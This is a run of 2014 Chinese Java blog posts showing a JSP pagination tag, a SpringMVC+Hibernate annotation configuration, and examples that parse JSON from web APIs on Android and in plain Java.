			pageWrapStr.append("if (isNaN(num) ||  num < 1 || num > pageCount){alert('请输入1-"+ pageCount + "范围内的页码!');return false;}");
			pageWrapStr.append("var tempUrl = url.replace('" + TEG + "', num);");
			pageWrapStr.append("window.location.href = tempUrl;");
			pageWrapStr.append("}</script>");
			//num != Integer.parseInt(num) ||
		}
		// 如果记录条数小于等于0，直接输出
		else {
			pageWrapStr.append("<table align='center' style='font-size:14px;'><tr><td>");
			pageWrapStr.append("总共<span style='color:red;'>0</span>条记录，当前显示0-0条记录。");
			pageWrapStr.append("</td></tr></table>");
			
		}
		
		// 输出
		this.getJspContext().getOut().println(pageWrapStr.toString());
	}
	/**
	 * 计算中间部分 [1]...[2][3]...[100]
	 * 
	 * @param buder
	 */
	private void calculatePage(StringBuffer buder) {
		// 总页数小于等于10
		if (pageCount <= 10) {
			for (int i = 1; i <= pageCount; i++) {
				// 判断哪一个是当前页
				if (i == pageIndex) {
					buder.append("<li><span style='color:red;' >" + i + "</span> </li>");
				} else {
					String tempUrl = submitUrl.replace(TEG, String.valueOf(i));
					buder.append("<li><a href='" + tempUrl + "'>" + i + "</a> </li>");
				}
			}
		} else { // 三种情况: 靠近第一页\靠近最后一页\中间
			if (pageIndex <= 8) { // 靠近第一页
				for (int i = 1; i < 10; i++) {
					// 判断哪一个是当前页
					if (i == pageIndex) {
						buder.append("<li><span style='color:red;' >" + i + "</span> </li>");
					} else {
						String tempUrl = submitUrl.replace(TEG, String.valueOf(i));
						buder.append("<li><a href='" + tempUrl + "'>" + i + "</a> </li>");
					}
				}
				// 后面部分加上更多
				String tempUrl = submitUrl.replace(TEG, String.valueOf(pageCount));
				buder.append("<li><a href='javascript:void(0);'>...</a></li>").append("<li><a href='" + tempUrl + "'>" + pageCount + "</a> </li>");
			} else if (pageIndex > pageCount - 8) { // 靠近最后一页
				// 前面部分加上更多[1]...
				String tempUrl = submitUrl.replace(TEG, String.valueOf(1));
				buder.append("<li><a href='" + tempUrl + "'>1</a> </li>").append("<li><a href='javascript:void(0);'>...</a></li>");
				for (int i = pageCount - 8; i <= pageCount; i++) {
					if (i == pageIndex) {
						buder.append("<li><span style='color:red;' >" + i + "</span> </li>");
					} else {
						tempUrl = submitUrl.replace(TEG, String.valueOf(i));
						buder.append("<li><a href='" + tempUrl + "'>" + i + "</a> </li>");
					}
				}
			} else { // 中间
						// 前面部分加上更多[1]...
				String tempUrl = submitUrl.replace(TEG, String.valueOf(1));
				buder.append("<li><a href='" + tempUrl + "'>1</a> </li>").append("<li><a href='javascript:void(0);'>...</a></li>");
				for (int i = pageIndex - 4; i <= pageIndex + 4; i++) {
					if (i == pageIndex) {
						buder.append("<li><span style='color:red;' >" + i + "</span> </li>");
					} else {
						tempUrl = submitUrl.replace(TEG, String.valueOf(i));
						buder.append("<li><a href='" + tempUrl + "'>" + i + "</a> </li>");
					}
				}
				// 后面部分加上更多
				tempUrl = submitUrl.replace(TEG, String.valueOf(pageCount));
				buder.append("<li><a href='javascript:void(0);'>...</a></li>").append("<li><a href='" + tempUrl + "'>" + pageCount + "</a></li>");
			}
		}
	}
	/** setter and getter method */
	public int getPageIndex() {
		return pageIndex;
	}
	public void setPageIndex(int pageIndex) {
		this.pageIndex = (pageIndex < 1) ? 1 : pageIndex;
	}
	public int getPageSize() {
		return pageSize;
	}
	public void setPageSize(int pageSize) {
		this.pageSize = pageSize;
	}
	public int getRecordCount() {
		return recordCount;
	}
	public void setRecordCount(int recordCount) {
		this.recordCount = recordCount;
	}
	public String getSubmitUrl() {
		return submitUrl;
	}
	public void setSubmitUrl(String submitUrl) {
		this.submitUrl = submitUrl;
	}
	public String getParms() {
		
		StringBuffer ps=new StringBuffer();
		if(parms!=null && parms.length()>0){
			//分离参数 A=b
			String[] parmsArr=parms.split("&");
			for(int i=0;i<parmsArr.length;i++){ 
				String parmstemp=parmsArr[i];
				String[] parmsEqArr=parmstemp.split("=");
				//分离参数 键 值 
				try {
					ps.append(i > 0 ? "&" : "");
					ps.append(parmsEqArr[0]).append("=");
					if(parmsEqArr.length>1){
						ps.append( URLEncoder.encode(parmsEqArr[1],"UTF-8"));
					}
				} catch (UnsupportedEncodingException e) {
					return "";
				}	
			}
		}
		
		return ps.toString();
	}
	public void setParms(String parms) {
		this.parms = parms;
	}
}
 源代码
 
http://download.csdn.net/detail/jilongliang/7302995
搭建请参考
http://jilongliang.iteye.com/blog/2061557
   
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
SpringMVC+Hibernate全注解整合, jilongliang.iteye.com.blog.2061557, Mon, 05 May 2014 14:36:15 +0800

package com.org.service.impl;
import java.util.List;
import javax.annotation.Resource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import com.org.dao.UserDao;
import com.org.entity.User;
import com.org.service.UserService;
/**
 *@Author:liangjilong
 *@Date:2014-2-25
 *@Version:1.0
 *@Description:
 */
@Service
public class UserServiceImpl implements UserService{
	@Resource//@Autowired
	private  UserDao userDao;
	
	public List<User> getListUsers() {
		return userDao.getListUsers();
	}
	 
}
 
package com.org.action;
import java.util.List;
import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;
import com.org.entity.User;
import com.org.service.UserService;
import com.org.utils.servlet.ServletUtils;
/**
 *@Author:liangjilong
 *@Date:2014-2-25
 *@Version:1.0
 *@Description:
 */
@Controller
public class UserController{
	@Resource
	private UserService userService; 
	
	@RequestMapping(value="/userList1.do")
	public String geUserList1(HttpServletRequest request ,HttpServletResponse response) throws Exception {
		List<User> lists=userService.getListUsers();
		if(lists!=null){
			//request.setAttribute("userList", lists);
			ServletUtils.setRequestValue("userList", lists);
		}
		return "/user/userList";//user文件下的userList.jsp
	}
	
	@RequestMapping(value="/userList2.do")
	public ModelAndView geUserList2(HttpServletRequest request ,HttpServletResponse response) throws Exception {
		List<User> lists=userService.getListUsers();
		if(lists!=null){
			//request.setAttribute("userList", lists);
			ServletUtils.setRequestValue("userList", lists);
		}
		
		return new ModelAndView("/user/userList");
	}
}
 
package com.org.dao;
import java.util.List;
import com.org.entity.User;
/**
 *@Author:liangjilong
 *@Date:2014-2-25
 *@Version:1.0
 *@Description:
 */
public interface UserDao {
	public List<User> getListUsers();
}
 
package com.org.dao.impl;
import java.util.List;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Repository;
import com.org.HibernateDaoImpl;
import com.org.dao.UserDao;
import com.org.entity.User;
/**
 *@Author:liangjilong
 *@Date:2014-2-25
 *@Version:1.0
 *@Description:
 */
@Repository//@Component
@SuppressWarnings("all")
public class UserDaoImpl extends HibernateDaoImpl implements UserDao {
 
	public List<User> getListUsers() {
		String hql="From User";
		//List<User>  lists=hibernateTemplate.find(hql);//方法一
		List<User>  lists=getHibernateTemplate().find(hql);//方法二
		return lists;
	}
}
 
package com.org.service;
import java.util.List;
import com.org.entity.User;
/**
 *@Author:liangjilong
 *@Date:2014-2-25
 *@Version:1.0
 *@Description:
 */
public interface UserService {
	public List<User> getListUsers();
 
}
 
package com.org;
import java.io.Serializable;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import org.apache.commons.lang3.StringUtils;
import org.hibernate.HibernateException;
import org.hibernate.Query;
import org.hibernate.Session;
import org.springframework.orm.hibernate3.HibernateCallback;
import org.springframework.orm.hibernate3.HibernateTemplate;
import org.springframework.orm.hibernate3.support.HibernateDaoSupport;
import org.springframework.util.CollectionUtils;
import org.springframework.util.ObjectUtils;
public class HibernateDaoImpl extends HibernateDaoSupport implements
		IHibernateDao {
	/**
	 * 这个和整合ibatis是一样的
	  */
	@Resource(name = "hibernateTemplate")
	protected HibernateTemplate hibernateTemplate;
	@PostConstruct
	public void initHibernateTemplate() {
		super.setHibernateTemplate(hibernateTemplate);
	}
	public Integer count(final String hql) {
		if (StringUtils.isEmpty(hql)) {
			throw new IllegalStateException("hql is null");
		}
		Object result = this.getHibernateTemplate().execute(
				new HibernateCallback<Object>() {
					public Object doInHibernate(Session session)
							throws HibernateException, SQLException {
						return session.createQuery(hql).uniqueResult();
					}
				});
		return ((Long) result).intValue();
	}
	public int bulkUpdate(String queryString, Object[] values) {
		return getHibernateTemplate().bulkUpdate(queryString, values);
	}
	public <E> void deleteAll(Collection<E> entities) {
		getHibernateTemplate().deleteAll(entities);
	}
	public Integer count(final String hql, final Object... obj) {
		if (ObjectUtils.isEmpty(obj)) {
			return count(hql);
		} else {
			if (StringUtils.isEmpty(hql)) {
				throw new IllegalStateException("hql is null");
			}
			Object result = this.getHibernateTemplate().execute(
					new HibernateCallback<Object>() {
						public Object doInHibernate(Session session)
								throws HibernateException, SQLException {
							Query query = session.createQuery(hql);
							for (int i = 0; i < obj.length; i++) {
								query.setParameter(i, obj[i]);
							}
							return query.uniqueResult();
						}
					});
			return ((Long) result).intValue();
		}
	}
	public <E> void delete(E entity) {
		getHibernateTemplate().delete(entity);
	}
	public <E> boolean exist(Class<E> c, Serializable id) {
		if (get(c, id) != null)
			return true;
		return false;
	}
	public <E> List<E> find(String queryString) {
		return getHibernateTemplate().find(queryString);
	}
	public <E> List<E> find(Class<E> bean) {
		String hql = "FROM " + bean.getSimpleName();
		return find(hql);
	}
	public List<?> find(String queryString, Object[] values) {
		if (ObjectUtils.isEmpty(values)) {
			return find(queryString);
		} else {
			return getHibernateTemplate().find(queryString, values);
		}
	}
	public <E> E findUniqueEntity(final String queryString,
			final Object... params) {
		if (StringUtils.isEmpty(queryString)) {
			throw new IllegalStateException("queryString is null");
		}
		if (ObjectUtils.isEmpty(params)) {
			return (E) getHibernateTemplate().execute(
					new HibernateCallback<Object>() {
						public Object doInHibernate(Session session) {
							return session.createQuery(queryString)
									.uniqueResult();
						}
					});
		} else {
			return (E) getHibernateTemplate().execute(
					new HibernateCallback<Object>() {
						public Object doInHibernate(Session session) {
							Query query = session.createQuery(queryString);
							for (int i = 0; i < params.length; i++) {
								query.setParameter(i, params[i]);
							}
							return query.uniqueResult();
						}
					});
		}
	}
	public <E> List<E> findByNamedQuery(String queryName) {
		if (StringUtils.isEmpty(queryName)) {
			throw new IllegalArgumentException("queryName is null");
		}
		return getHibernateTemplate().findByNamedQuery(queryName);
	}
	public <E> List<E> findByNamedQuery(String queryName, Object... values) {
		if (ObjectUtils.isEmpty(values)) {
			return this.findByNamedQuery(queryName);
		}
		return getHibernateTemplate().findByNamedQuery(queryName, values);
	}
	public <E> List<E> findByPage(final String hql, final Integer startRow,
			final Integer pageSize, final Object... params) {
		if (StringUtils.isEmpty(hql)) {
			throw new IllegalStateException("hql is null");
		}
		if (ObjectUtils.isEmpty(params)) {
			return getHibernateTemplate().executeFind(
					new HibernateCallback<Object>() {
						public Object doInHibernate(Session session) {
							return session.createQuery(hql)
									.setFirstResult(startRow)
									.setMaxResults(pageSize).list();
						}
					});
		} else {
			return getHibernateTemplate().executeFind(
					new HibernateCallback<Object>() {
						public Object doInHibernate(Session session) {
							Query query = session.createQuery(hql);
							for (int i = 0; i < params.length; i++) {
								query.setParameter(i, params[i]);
							}
							return query.setFirstResult(startRow)
									.setMaxResults(pageSize).list();
						}
					});
		}
	}
	public <E> E get(Class<E> entityClass, Serializable id) {
		this.getHibernateTemplate().setCacheQueries(true);
		return this.getHibernateTemplate().get(entityClass, id);
	}
	public <E> Iterator<E> iterate(String queryString) {
		return getHibernateTemplate().iterate(queryString);
	}
	public <E> Iterator<E> iterate(String queryString, Object... values) {
		return getHibernateTemplate().iterate(queryString, values);
	}
	public <E> E load(Class<E> entityClass, Serializable id) {
		return getHibernateTemplate().load(entityClass, id);
	}
	public <E> void persist(E entity) {
		getHibernateTemplate().persist(entity);
	}
	public <E> void refresh(E entity) {
		getHibernateTemplate().refresh(entity);
	}
	public <E> Serializable save(E entity) {
		if (entity == null) {
			throw new IllegalArgumentException("entity is null");
		}
		return getHibernateTemplate().save(entity);
	}
	public <E> void saveOrUpdate(E entity) {
		getHibernateTemplate().saveOrUpdate(entity);
	}
	public <E> void saveOrUpdateAll(Collection<E> entities) {
		getHibernateTemplate().saveOrUpdateAll(entities);
	}
	public <E> void update(E entity) {
		getHibernateTemplate().update(entity);
	}
	public <T> void updateAll(Collection<T> entities) {
		if (CollectionUtils.isEmpty(entities)) {
			throw new IllegalArgumentException("entities is null");
		}
		int i = 0;
		for (Object obj : entities) {
			if (i % 30 == 0) {
				getHibernateTemplate().flush();
				getHibernateTemplate().clear();
			}
			getHibernateTemplate().update(obj);
			i++;
		}
	}
	public <E> void saveAll(Collection<E> entities) {
		if (CollectionUtils.isEmpty(entities)) {
			throw new IllegalArgumentException("entities is null");
		}
		int i = 0;
		for (E obj : entities) {
			if (i % 30 == 0) {
				getHibernateTemplate().flush();
				getHibernateTemplate().clear();
			}
			save(obj);
			i++;
		}
	}
	public <E> List<E> findByPage(String queryString, PageModel pageModel,
			List<?> params) {
		String hql = queryString;
		if (queryString.toLowerCase().indexOf("where") == -1) {
			Matcher m = Pattern.compile("and").matcher(queryString);
			if (m.find()) {
				hql = m.replaceFirst("where");
			} else {
				m = Pattern.compile("AND").matcher(queryString);
				if (m.find()) {
					hql = m.replaceFirst("WHERE");
				}
			}
		}
		int fromIndex = hql.toLowerCase().indexOf("from");
		int orderIndex = hql.toLowerCase().indexOf("group by");
		String hqlCount = "select count(*) "
				+ hql.substring(fromIndex,
						orderIndex > 0 ? orderIndex : hql.length());
		int totalCount = (params == null || params.isEmpty()) ? count(hqlCount)
				: count(hqlCount, params.toArray());
		pageModel.setRecordCount(totalCount);
		if (totalCount == 0) {
			return new ArrayList<E>();
		}
		Object[] temps = (params == null || params.isEmpty()) ? new Object[] {}
				: params.toArray();
		return this.findByPage(hql, pageModel.getStartRow(),
				pageModel.getPageSize(), temps);
	}
}
 
 
 
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:mvc="http://www.springframework.org/schema/mvc" 
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
	xmlns:context="http://www.springframework.org/schema/context"
	xmlns:aop="http://www.springframework.org/schema/aop" 
	xmlns:tx="http://www.springframework.org/schema/tx"
	xmlns:oscache="http://www.springmodules.org/schema/oscache"
	xsi:schemaLocation="http://www.springframework.org/schema/beans
	 	 http://www.springframework.org/schema/beans/spring-beans-3.1.xsd 
	 	 http://www.springframework.org/schema/context
	 	 http://www.springframework.org/schema/context/spring-context-3.1.xsd 
	 	 http://www.springframework.org/schema/aop 
	 	 http://www.springframework.org/schema/aop/spring-aop-3.1.xsd 
	 	 http://www.springframework.org/schema/tx 
	 	 http://www.springframework.org/schema/tx/spring-tx-3.1.xsd 
	 	 http://www.springmodules.org/schema/oscache 
	 	 http://www.springmodules.org/schema/cache/springmodules-oscache.xsd
	 	 http://www.springframework.org/schema/mvc
	 	 http://www.springframework.org/schema/mvc/spring-mvc-3.1.xsd">
	<!--
		 对web包中的所有类进行扫描，以完成Bean创建和自动依赖注入的功能 
		 mvc:annotation-driven
	--> 
	<mvc:annotation-driven/>
	<!-- 扫描包 -->
	<context:annotation-config/>  
	<context:component-scan base-package="com.org.*" />
	
	<bean id="jspViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
		<property name="viewClass" value="org.springframework.web.servlet.view.JstlView" />
		  <property name="prefix" value="/jsp/" />
		<property name="suffix" value=".jsp" />  
	</bean>
	
	<!-- 配置jdbc -->
	<bean class="org.springframework.beans.factory.config.PreferencesPlaceholderConfigurer">
		<property name="locations">
			<value>classpath:properties/jdbc.properties</value>
		</property>
	</bean>
	<!-- 配置數據源 -->
	<bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource"
		destroy-method="close">
		<property name="driverClassName" value="${jdbc.driver}" />
		<property name="url" value="${jdbc.url}" />
		<property name="username" value="${jdbc.username}" />
		<property name="password" value="${jdbc.password}" />
		<!-- 连接池启动时的初始值 -->
        <property name="initialSize" value="1"/>  
        <property name="maxActive" value="500"/>    
        <property name="maxIdle" value="2"/>        
        <property name="minIdle" value="1"/> 
	</bean>
		<!-- 配置sessionFactory 
		注解配置
			org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean
		配置形式:
			org.springframework.orm.hibernate3.LocalSessionFactoryBean
		-->
		
	<bean id="sessionFactory" class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">
		<property name="dataSource" ref="dataSource" />
	 	 <property name="packagesToScan">
			<list>
				<value>com.org.entity</value>
			</list>
		</property>
		 
		<property name="hibernateProperties">
			<props>
				<prop key="hibernate.dialect">${hibernate.dialect}</prop>
				<prop key="hibernate.show_sql">true</prop>
			</props>
		</property>
	</bean>
	
	<!-- 配置hibernateTemplate -->
	<bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate">
		<property name="sessionFactory" ref="sessionFactory" />
	</bean>
	
	<bean id="transactionManager"
		class="org.springframework.orm.hibernate3.HibernateTransactionManager">
		<property name="sessionFactory" ref="sessionFactory" />
	</bean>
	<!-- Spring AOP config配置切点 -->  
	<aop:config>
		<aop:pointcut expression="execution(public * com.org.service.*.*(..))"
			id="bussinessService" />
		<aop:advisor advice-ref="txAdvice" pointcut-ref="bussinessService" />
	</aop:config>
	<!-- 配置那个类那个方法用到事务处理 -->
	<tx:advice id="txAdvice" transaction-manager="transactionManager">
		<tx:attributes>
			<tx:method name="get*" read-only="true" />
			<tx:method name="add*" propagation="REQUIRED" />
			<tx:method name="update*" propagation="REQUIRED" />
			<tx:method name="delete*" propagation="REQUIRED" />
			<tx:method name="*" propagation="REQUIRED" />
		</tx:attributes>
	</tx:advice>
	
	
<!-- 这个映射配置主要是用来进行静态资源的访问 -->
 <mvc:resources mapping="/js/**" location="/js/" cache-period="31556926"/> 
 <mvc:resources mapping="/resource/**" location="/resource/" />  
 <mvc:resources mapping="/jsp/**" location="/jsp/" /> 
 
</beans>
 
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" id="WebApp_ID" version="2.5">
 <!--
		#####################################配置处理乱码#####################################
	-->
	<filter>
		<filter-name>encodingFilter</filter-name>
		<filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
		<init-param>
			<param-name>encoding</param-name>
			<param-value>GBK</param-value>
		</init-param>
	</filter>
	<filter-mapping>
		<filter-name>encodingFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
	<!--
		#####################################Spring	MVC配置#################################
		application-servlet.xml,规定:xxx-servlet.xml
	-->
	<listener>
		<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
	</listener>
	<context-param>
	 
		<param-name>contextConfigLocation</param-name>
		<!--
			param-name必须要等于contextConfigLocation
			默认的配置
			<param-value>/WEB-INF/applicationContext-*.xml,classpath*:applicationContext-*.xml</param-value>
		-->
		<param-value>classpath:spring-*.xml</param-value>
	</context-param>
	
	<servlet>
		<servlet-name>springMVC</servlet-name>
		<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
		<init-param>
			<param-name>contextConfigLocation</param-name>
			<param-value>classpath:spring-*.xml</param-value>
		</init-param>
		<load-on-startup>1</load-on-startup>
	</servlet>
	<servlet-mapping>
		<servlet-name>springMVC</servlet-name>
		<url-pattern>*.do</url-pattern>
	</servlet-mapping>
	
	<!--
		#####################################struts2配置#######################################
	-->
	<!-- 此配置在使用struts2 -->
 		<filter> 
 			<filter-name>struts2</filter-name> 
 			<filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class> 
 		</filter> 
		<filter-mapping> 
			<filter-name>struts2</filter-name> 
			<url-pattern>/*</url-pattern> 
		</filter-mapping> 
	<!--
		################################使用freemaker模板中启动JSPSupportServlet#############################
	
	<servlet>
		<servlet-name>JspSupportServlet</servlet-name>
		<servlet-class>org.apache.struts2.views.JspSupportServlet</servlet-class>
		<load-on-startup>1</load-on-startup>
	</servlet>
	-->
  <welcome-file-list>
    <welcome-file>index.html</welcome-file>
    <welcome-file>index.htm</welcome-file>
    <welcome-file>index.jsp</welcome-file>
    <welcome-file>default.html</welcome-file>
    <welcome-file>default.htm</welcome-file>
    <welcome-file>default.jsp</welcome-file>
  </welcome-file-list>
</web-app>
 
   
 源代码
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Android解析json数据, jilongliang.iteye.com.blog.2056544, Tue, 29 Apr 2014 09:35:55 +0800

package com.org.json;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import com.org.utils.ServerUtils;
public class MainActivity extends Activity {
	private String Url="http://api.k780.com:88/?app=entry.qihu&domain=www.baidu.com&appkey=10003&sign=b59bc3ef6191eb9f747dd4e83c99f2a4&format=json";
	private TextView tv;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
    	 
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        tv=(TextView)findViewById(R.id.TestJson);
 	    //StrictModeUtil.setStrictMode();
 	    
        String text=ServerUtils.getContent(Url);
        try {
			 JSONObject json=new JSONObject(text);
			  
			 String success=json.get("success").toString();
			 
			 JSONObject result=(JSONObject)json.get("result");
			 String website=result.get("website").toString();
			 String entry=result.get("entry").toString();
			 String update=result.get("update").toString();
	 
	      
	         tv.setText(success+entry+update+website);
	         //tv.setMovementMethod(LinkMovementMethod.getInstance());
		} catch (JSONException e) {
			e.printStackTrace();
		}
    }
    
}
 
 
package com.org.utils;
import java.io.IOException;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
public class ServerUtils {
	
	/***
	 * 抓取服务端的内容
	 * @param url
	 * @return
	 */
	public static String getContent(String url){
		HttpClient client=new DefaultHttpClient();
		HttpEntity httpEntity=null;
		String result="";
		try {
			HttpGet post=new HttpGet(url);
			HttpResponse httpResponse = client.execute(post);
		    httpEntity=httpResponse.getEntity();
			if(httpEntity!=null){
				result=EntityUtils.toString(httpEntity, "UTF-8").trim();
				return result; 
			}
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			try {
				httpEntity.consumeContent();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
}
 
    本文附件下载:
    
      Json.zip (2.4 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用org.json解析较复杂的百度API附近的银行等地方, jilongliang.iteye.com.blog.2056243, Mon, 28 Apr 2014 17:27:23 +0800

package com.org.utils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
public class ServerUtils {
	
	private static String content = "",line=System.getProperty("line.separator");//换行相当于\n 
	public static String getContent(String url){
		HttpClient client=new DefaultHttpClient();
		HttpEntity httpEntity=null;
		String result="";
		try {
			HttpGet post=new HttpGet(url);
			HttpResponse httpResponse = client.execute(post);
		    httpEntity=httpResponse.getEntity();
			if(httpEntity!=null){
				result=EntityUtils.toString(httpEntity, "UTF-8").trim();
				return result; 
			}
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			try {
				httpEntity.consumeContent();
				 
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	/** 
     * 读文件流 
     * @param formPath从哪里读取的文件路径 
     * @return 
     */  
    public static String readerFile(String formPath) {  
        FileReader read = null;  
        BufferedReader reader = null;  
        try {  
            read = new FileReader(new File(formPath));  
            reader = new BufferedReader(read);  
            StringBuffer buffer = new StringBuffer("");  
            content = reader.readLine();  
            while (content != null) {  
                buffer.append(content).append(line);  
                content = reader.readLine();  
            }  
            return content = buffer.toString();//返回  
        } catch (Exception e) {  
            e.printStackTrace();  
        } finally {  
            try {  
                if (reader != null)reader.close();  
                if (read != null)read.close();  
            } catch (Exception e) {  
                e.printStackTrace();  
            }  
        }  
        return "";//没值就返回空  
    }  
      
	
	public static void main(String[] args) {
		  String Url="http://api.k780.com:88/?app=entry.qihu&domain=www.baidu.com&appkey=10003&sign=b59bc3ef6191eb9f747dd4e83c99f2a4&format=json";
		  System.out.println(getContent(Url));
	}
}
 
package com.org.json;
import org.json.JSONArray;
import org.json.JSONObject;
import com.org.utils.ServerUtils;
/**
 * @Author:liangjilong
 * @Date:2014-4-28
 * @Version:1.0
 * @Descript:从本地的文本读取文件下来解析json数据
 */
public class TestJson2 {
	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		
		String path=TestJson2.class.getClassLoader().getResource("json.txt").getFile();
		String json = ServerUtils.readerFile(path);
		JSONObject jsonObj = new JSONObject(json);
		String status = jsonObj.get("status").toString();// 解析status节点
		// System.out.println(status);
		String  results=jsonObj.get("results").toString();//results节点
	
		JSONArray  resultArrs=new JSONArray(results);
		 
		for (int i = 0; i < resultArrs.length(); i++) {
			JSONObject resultObj=(JSONObject)resultArrs.get(i);  
			String name="第"+i+resultObj.get("name");//results下的name节点
			
			String address=resultObj.getString("address");////results下的address节点
			
			if(resultObj.has("telephone")){//判断是否有这个节点
				String telephone=resultObj.getString("telephone");////results下的telephone节点
				System.out.println(telephone);
			}
			String detail_url=resultObj.get("detail_url").toString();
			if(resultObj.has("tag")){//判断是否有这个节点
				String tag=resultObj.get("tag").toString();
			}
			
			
			JSONObject locationObj=(JSONObject)resultObj.get("location");//location节点
			
			String lat=locationObj.getString("lat");//location节点lat经度
			String lng=locationObj.getString("lng");//location节点lng伟度
			System.out.println(lng);
			
		}
		 
	}
}
 
package com.org.json;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;
import com.org.utils.ServerUtils;
/**
 * @Author:liangjilong
 * @Date:2014-4-28
 * @Version:1.0
 * @Descript:从网络上抓去下来解析json数据
 */
public class TestJson1 {
	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		String key="D4tWvZgUrICf3oga0Q0uT5sk";	
		String url=	getUrl("银行", key);	//即搜索经纬度39.915,116.404,39.975,116.414的附近的银行
		String json = ServerUtils.getContent(url);
		JSONObject jsonObj = new JSONObject(json);
		String status = jsonObj.get("status").toString();// 解析status节点
		// System.out.println(status);
		String  results=jsonObj.get("results").toString();//results节点
	
		JSONArray  resultArrs=new JSONArray(results);
		 
		for (int i = 0; i < resultArrs.length(); i++) {
			JSONObject resultObj=(JSONObject)resultArrs.get(i);  
			String name="第"+i+resultObj.get("name");//results下的name节点
			
			String address=resultObj.getString("address");////results下的address节点
			
			if(resultObj.has("telephone")){//判断是否有这个节点
				String telephone=resultObj.getString("telephone");////results下的telephone节点
				System.out.println(telephone);
			}
			String detail_url=resultObj.get("detail_url").toString();
			if(resultObj.has("tag")){//判断是否有这个节点有就取出来
				String tag=resultObj.get("tag").toString();
			}
		
			JSONObject locationObj=(JSONObject)resultObj.get("location");//location节点
			
			String lat=locationObj.getString("lat");//location节点lat经度
			String lng=locationObj.getString("lng");//location节点lng伟度
			System.out.println(lng);
			
		}
		 
	}
	
	/**
	 * 
	 * @param keyWord搜索的地方
	 * @param key百度申请的ak密钥
	 * @return
	 * @throws Exception
	 */
	public static String getUrl(String keyWord, String key)throws Exception{
		StringBuffer buffer=new StringBuffer();
		buffer.append("http://api.map.baidu.com/place/search?");
		buffer.append("&query="+URLEncoder.encode(keyWord,"utf-8"));
		buffer.append("&bounds="+"39.915,116.404,39.975,116.414");//经纬度
		buffer.append("&output=json");//输出格式(JSON/XML)
		buffer.append("&key="+key);
		return buffer.toString();
	}
}
  
    本文附件下载:
    
      httpclient4.x.zip (2.4 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
(转)Java构造和解析Json数据的两种方法详解二, jilongliang.iteye.com.blog.2051884, Tue, 22 Apr 2014 15:31:28 +0800
